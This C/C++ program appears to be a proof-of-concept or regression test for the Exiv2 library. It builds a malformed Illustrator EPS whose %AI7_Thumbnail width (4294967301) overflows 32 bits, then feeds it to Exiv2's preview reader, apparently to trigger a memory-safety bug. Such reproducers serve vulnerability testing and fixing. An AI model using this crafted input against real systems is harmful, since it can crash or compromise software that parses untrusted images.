#include <exiv2/exiv2.hpp>

#include <exception>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

static void append_mem(unsigned char* dst, size_t* used, size_t cap, const void* src, size_t n) {
  if (*used + n > cap) {
    return;
  }
  memcpy(dst + *used, src, n);
  *used += n;
}

static void append_str(unsigned char* dst, size_t* used, size_t cap, const char* s) {
  append_mem(dst, used, cap, s, strlen(s));
}

static char hex_digit(unsigned v) {
  return (char)(v < 10 ? '0' + v : 'A' + (v - 10));
}

/* Illustrator EPS carrying an %AI7_Thumbnail and a hex image section. */
int main(void) {
  unsigned char eps[8192];
  size_t used = 0;
  unsigned char payload[768 + 32];
  char hex[sizeof(payload) * 2 + 1];
  size_t i;

  memset(payload, 0, sizeof(payload));
  for (i = 0; i < 256; i++) {
    payload[i * 3 + 0] = (unsigned char)(i & 0xff);
    payload[i * 3 + 1] = 0;
    payload[i * 3 + 2] = 0;
  }
  for (i = 0; i < 32; i++) {
    payload[768 + i] = 1;
  }
  for (i = 0; i < sizeof(payload); i++) {
    hex[i * 2] = hex_digit(payload[i] >> 4);
    hex[i * 2 + 1] = hex_digit(payload[i] & 0x0f);
  }
  hex[sizeof(payload) * 2] = '\0';

  append_str(eps, &used, sizeof(eps), "%!PS-Adobe-3.0 EPSF-3.0\n");
  append_str(eps, &used, sizeof(eps), "%%BoundingBox: 0 0 1 1\n");
  append_str(eps, &used, sizeof(eps), "%AI7_Thumbnail: 4294967301 1 8\n");
  append_str(eps, &used, sizeof(eps), "%%BeginData: 800 Hex\n");
  append_str(eps, &used, sizeof(eps), "%");
  append_str(eps, &used, sizeof(eps), hex);
  append_str(eps, &used, sizeof(eps), "\n%%EndData\n");
  append_str(eps, &used, sizeof(eps), "%%EndComments\n");
  append_str(eps, &used, sizeof(eps), "%%EOF\n");

  try {
    auto image = Exiv2::ImageFactory::open(eps, used);
    if (!image) {
      return 0;
    }
    image->readMetadata();
    Exiv2::PreviewManager manager(*image);
    Exiv2::PreviewPropertiesList props = manager.getPreviewProperties();
    for (size_t n = 0; n < props.size(); n++) {
      Exiv2::PreviewImage preview = manager.getPreviewImage(props[n]);
      if (preview.pData() != nullptr && preview.size() > 0) {
        volatile unsigned char sink = preview.pData()[0];
        (void)sink;
      }
    }
  } catch (const Exiv2::Error&) {
    return 0;
  } catch (const std::exception&) {
    return 0;
  }
  return 0;
}
